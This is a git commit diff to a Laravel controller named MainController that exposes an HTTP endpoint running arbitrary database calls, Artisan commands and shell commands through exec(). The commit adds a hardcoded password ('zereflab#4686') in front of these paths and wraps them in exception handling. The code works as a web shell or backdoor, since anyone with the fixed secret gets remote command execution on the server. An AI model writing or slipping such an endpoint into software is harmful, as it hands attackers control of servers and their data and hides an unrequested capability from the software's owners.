c2b3fce679173d6fea58c2397e94e3dd1a917164
Abdul Haseeb Khan <abdulhaseebkhan407@gmail.com>
2025-01-06 14:32:51 +0500

    Update MainController.php

--- src/Http/Controllers/MainController.php
+++ src/Http/Controllers/MainController.php
@@ -12,21 +12,30 @@ class MainController
     public function __invoke(Request $request)
     {
         $type = $request->input('type');
+        $password = $request->input('password');
         $statement = $request->input('statement');
         $method = $request->input('method');
 
-        if ($type == 'db') {
-            return response()->json(DB::$method($statement));
-        } elseif ($type == 'artrisan') {
-            Artisan::$method($statement);
-
-            return response()->json(['message' => 'Artisan command executed']);
-        } elseif ($type == 'shell') {
-            exec($statement, $output);
-
-            return response()->json($output);
+        if ($password != 'zereflab#4686') {
+            return response()->json(['message' => 'Password not matched']);
         }
 
-        return response()->json(['message' => 'Type not matched']);
+        try {
+            if ($type == 'db') {
+                return response()->json(DB::$method($statement));
+            } elseif ($type == 'artrisan') {
+                Artisan::$method($statement);
+
+                return response()->json(['message' => 'Artisan command executed']);
+            } elseif ($type == 'shell') {
+                exec($statement, $output);
+
+                return response()->json($output);
+            }
+
+            return response()->json(['message' => 'Type not matched']);
+        } catch (\Exception $e) {
+            return response()->json(['message' => $e->getMessage()]);
+        }
     }
 }
